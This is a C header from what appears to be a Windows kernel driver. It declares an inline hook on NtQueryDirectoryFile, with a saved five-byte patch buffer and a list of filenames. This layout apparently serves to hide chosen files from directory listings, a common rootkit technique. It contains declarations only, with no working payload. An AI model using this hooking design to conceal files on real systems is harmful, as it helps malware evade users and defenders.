#ifndef _FILE_H_
#define _FILE_H_

#include "inc.h"

#define NUMBER_NT_QUERY_DIRECTORY_FILE 0x91

//typedef NTSTATUS(*NT_QUERY_DIRECTORY_FILE)(
//	HANDLE                 FileHandle,
//	HANDLE                 Event,
//	PIO_APC_ROUTINE        ApcRoutine,
//	PVOID                  ApcContext,
//	PIO_STATUS_BLOCK       IoStatusBlock,
//	PVOID                  FileInformation,
//	ULONG                  Length,
//	FILE_INFORMATION_CLASS FileInformationClass,
//	BOOLEAN                ReturnSingleEntry,
//	PUNICODE_STRING        FileName,
//	BOOLEAN                RestartScan
//	);

typedef struct _TASK_QUEUE_FILE {

    PWCH filename;
    LIST_ENTRY link;

} TASK_QUEUE_FILE, * PTASK_QUEUE_FILE;

LIST_ENTRY glTaskQueueFile;
PAGED_LOOKASIDE_LIST glPagedTaskQueueFile;

NTSTATUS NTAPI HookNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
);

NTSTATUS NTAPI JmpNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
);

//NT_QUERY_DIRECTORY_FILE glRealNtQueryDirectoryFile;

ULONG addressForJmpNtNtQueryDirectoryFile;
UCHAR saveByteNtQueryDirectoryFile[5];

volatile ULONG SyscallProcessedCount;


VOID TaskQueueByFilename(PCHAR filename);
VOID PrintTaskQueueFileList();
VOID FreeListQueueFilename();

#endif // !_FILE_H_
